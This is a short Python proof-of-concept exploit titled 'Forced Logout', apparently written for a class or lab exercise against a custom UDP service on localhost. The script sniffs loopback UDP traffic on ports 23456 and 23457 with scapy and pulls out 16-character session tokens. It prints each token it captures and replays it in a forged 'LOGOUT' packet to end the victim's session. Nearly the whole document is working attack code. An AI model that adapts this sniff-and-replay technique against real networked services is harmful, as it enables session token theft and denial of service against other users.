#Vulnerability Name - Forced Logout
#This will listen for a token in the network (in this case lo) and force a logout anytime it detects one.
import socket
from scapy.all import *

def print_pkt(pkt):

    payload = pkt["Raw"].load.decode("utf-8")

    print(pkt["UDP"].dport)

    token = payload.split(";")[0]

    if len(token) == 16 and (pkt["UDP"].dport == 23456 or pkt["UDP"].dport == 23457):
        print("TOKEN HERE: " + str(token))

        with socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) as s:
            execute = "LOGOUT %s" % token
            s.sendto(execute.encode("utf-8"),("127.0.0.1", pkt["UDP"].dport))
            

pkt = sniff(iface="lo",filter="udp and (port 23456 or port 23457)", prn=print_pkt)
